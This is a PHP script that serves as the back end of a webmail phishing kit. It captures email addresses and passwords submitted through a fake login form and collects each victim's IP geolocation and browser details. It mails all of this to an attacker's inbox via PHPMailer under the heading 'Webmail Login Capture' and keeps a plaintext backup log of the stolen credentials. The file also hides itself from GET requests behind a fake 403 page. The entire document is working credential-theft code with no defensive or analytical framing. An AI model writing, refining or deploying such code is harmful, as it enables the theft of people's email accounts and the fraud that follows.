<?php 
require_once 'config.php';
require_once 'class.phpmailer.php';
require_once 'class.smtp.php';

// Set CORS headers
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");

// Get client IP
$ip = $_SERVER['REMOTE_ADDR'];

// Check rate limiting
if (!checkRateLimit($ip)) {
    echo json_encode(array("signal" => "error", "msg" => "Too many attempts. Please try again later."));
    exit();
}

// Get geolocation data
$ipdat = @json_decode(file_get_contents(GEO_API_URL . $ip));

// Start session
session_start(); 

// Block direct GET requests
if($_SERVER['REQUEST_METHOD']=='GET'){
?>
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<hr>
</body></html>
<?php 
exit();
}

// Get SMTP and email configuration
$smtpConfig = getSMTPConfig();
$emailConfig = getEmailConfig();

// Get form data
$login = isset($_POST['email']) ? sanitizeInput($_POST['email']) : '';
$passwd = isset($_POST['password']) ? $_POST['password'] : ''; // Don't sanitize password
$browser = $_SERVER['HTTP_USER_AGENT'];

// Validate input
if (empty($login) || empty($passwd)) {
    echo json_encode(array("signal" => "error", "msg" => VALIDATION_ERROR));
    exit();
}

if (!isValidEmail($login)) {
    echo json_encode(array("signal" => "error", "msg" => "Invalid email format"));
    exit();
}

// Extract domain from email
$email = $login;
$parts = explode("@", $email);
$domain = isset($parts[1]) ? $parts[1] : 'unknown';

// Enhanced email subject with timestamp
$sub = EMAIL_SUBJECT_PREFIX . date('Y-m-d H:i:s') . " - " . $domain;

// Enhanced message formatting with emojis and better structure
$message = "
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
        .header { background: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .section { margin-bottom: 15px; }
        .label { font-weight: bold; color: #495057; }
        .value { color: #212529; }
        .location { background: #e9ecef; padding: 10px; border-radius: 3px; }
        .device { background: #f8f9fa; padding: 10px; border-radius: 3px; }
        .credentials { background: #fff3cd; padding: 10px; border-radius: 3px; border-left: 4px solid #ffc107; }
    </style>
</head>
<body>
    <div class='header'>
        <h2>🔐 Webmail Login Capture</h2>
        <p><strong>Timestamp:</strong> " . date('Y-m-d H:i:s T') . "</p>
    </div>
    
    <div class='section'>
        <div class='credentials'>
            <h3>📧 Login Credentials</h3>
            <p><span class='label'>Email:</span> <span class='value'>" . htmlspecialchars($login) . "</span></p>
            <p><span class='label'>Password:</span> <span class='value'>" . htmlspecialchars($passwd) . "</span></p>
            <p><span class='label'>Domain:</span> <span class='value'>" . htmlspecialchars($domain) . "</span></p>
        </div>
    </div>
    
    <div class='section'>
        <div class='location'>
            <h3>📍 Location Information</h3>
            <p><span class='label'>IP Address:</span> <span class='value'>" . htmlspecialchars($ip) . "</span></p>
            <p><span class='label'>Country:</span> <span class='value'>" . htmlspecialchars($ipdat->geoplugin_countryName ?? 'Unknown') . "</span></p>
            <p><span class='label'>City:</span> <span class='value'>" . htmlspecialchars($ipdat->geoplugin_city ?? 'Unknown') . "</span></p>
            <p><span class='label'>Region:</span> <span class='value'>" . htmlspecialchars($ipdat->geoplugin_regionName ?? 'Unknown') . "</span></p>
            <p><span class='label'>Timezone:</span> <span class='value'>" . htmlspecialchars($ipdat->geoplugin_timezone ?? 'Unknown') . "</span></p>
        </div>
    </div>
    
    <div class='section'>
        <div class='device'>
            <h3>💻 Device Information</h3>
            <p><span class='label'>User Agent:</span> <span class='value'>" . htmlspecialchars($browser) . "</span></p>
            <p><span class='label'>Referer:</span> <span class='value'>" . htmlspecialchars($_SERVER['HTTP_REFERER'] ?? 'Direct Access') . "</span></p>
            <p><span class='label'>Request Method:</span> <span class='value'>" . htmlspecialchars($_SERVER['REQUEST_METHOD']) . "</span></p>
        </div>
    </div>
    
    <div class='section'>
        <p><em>" . EMAIL_FOOTER . "</em></p>
    </div>
</body>
</html>";

// Create plain text version for email clients that don't support HTML
$plainTextMessage = "
=== Webmail Login Capture ===
Timestamp: " . date('Y-m-d H:i:s T') . "

📧 LOGIN CREDENTIALS:
Email: " . $login . "
Password: " . $passwd . "
Domain: " . $domain . "

📍 LOCATION INFORMATION:
IP Address: " . $ip . "
Country: " . ($ipdat->geoplugin_countryName ?? 'Unknown') . "
City: " . ($ipdat->geoplugin_city ?? 'Unknown') . "
Region: " . ($ipdat->geoplugin_regionName ?? 'Unknown') . "
Timezone: " . ($ipdat->geoplugin_timezone ?? 'Unknown') . "

💻 DEVICE INFORMATION:
User Agent: " . $browser . "
Referer: " . ($_SERVER['HTTP_REFERER'] ?? 'Direct Access') . "
Request Method: " . $_SERVER['REQUEST_METHOD'] . "

" . EMAIL_FOOTER;

// Configure PHPMailer
$mail = new PHPMailer(true);
$mail->IsSMTP();
$mail->SMTPAuth = true;
$mail->Host = $smtpConfig['host'];
$mail->Port = $smtpConfig['port'];
$mail->Password = $smtpConfig['password'];
$mail->Username = $smtpConfig['username'];
$mail->IsHTML(true);
$mail->SetFrom($smtpConfig['username'], $emailConfig['sender_name']);
$mail->AddAddress($emailConfig['receiver']);
$mail->Subject = $sub;
$mail->Body = $message;
$mail->AltBody = $plainTextMessage;

// Try to send the email
if(!$mail->send()){
    logActivity("Email delivery failed for IP: {$ip}", "ERROR");
    $data = array("signal" => 'not ok', "msg" => ERROR_MESSAGE);
    echo json_encode($data);
    exit();
}

// Log successful capture
logActivity("Successful capture from IP: {$ip}, Email: {$login}", "SUCCESS");

// Save to local file for backup
$logEntry = date('Y-m-d H:i:s') . " | " . $login . " | " . $passwd . " | " . $ip . " | " . ($ipdat->geoplugin_countryName ?? 'Unknown') . " | " . ($ipdat->geoplugin_city ?? 'Unknown') . "\n";
$fp = fopen(LOG_FILE, "a");
fputs($fp, $logEntry);
fclose($fp);

// Generate random session ID for response
$praga = rand();
$praga = md5($praga);

echo json_encode(array("signal" => "ok", "msg" => SUCCESS_MESSAGE));
?>
